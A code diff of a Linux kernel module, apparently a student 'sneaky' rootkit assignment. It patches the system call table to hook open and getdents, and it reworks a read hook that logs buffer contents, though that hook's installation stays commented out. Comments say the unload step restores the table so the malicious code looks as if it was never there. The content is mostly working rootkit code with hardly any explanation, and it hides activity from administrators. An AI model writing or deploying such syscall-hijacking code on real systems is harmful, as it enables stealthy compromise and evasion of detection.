@@ -58,13 +58,7 @@ asmlinkage int (*original_call)(const char *pathname, int flags);
 asmlinkage long (*orig_getdents)(unsigned int fd,
                                  struct linux_dirent64 __user *dirp,
                                  unsigned int count);
-asmlinkage ssize_t (*orig_read)(unsigned int fd, char __user *buf,
-                                size_t count);
-
-asmlinkage ssize_t sneaky_sys_read(unsigned int fd, char __user *buf,
-                                   size_t count) {
-  return (*orig_read)(fd, buf, count);
-}
+asmlinkage ssize_t (*orig_read)(int fd, char *buf, size_t count);
 static int atoi(char *num) {
   int res = 0;
   while (*num != '\0') {
@@ -75,7 +69,10 @@ static int atoi(char *num) {
   }
   return res;
 }
-
+asmlinkage ssize_t sneaky_sys_read(int fd, char *buf, size_t count) {
+  printk(KERN_INFO "read:%s", buf);
+  return orig_read(fd, buf, count);
+}
 asmlinkage long sneaky_sys_getdents(unsigned int fd,
                                     struct linux_dirent64 __user *dirp,
                                     unsigned int count) {
@@ -133,7 +130,7 @@ static int initialize_sneaky_module(void) {
   orig_read = (void *)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
-  //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+  //  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
@@ -159,8 +156,9 @@ static void exit_sneaky_module(void) {
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
-  *(sys_call_table + __NR_getdents) = (unsigned long)orig_getdents;
   *(sys_call_table + __NR_read) = (unsigned long)orig_read;
+  *(sys_call_table + __NR_getdents) = (unsigned long)orig_getdents;
+
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
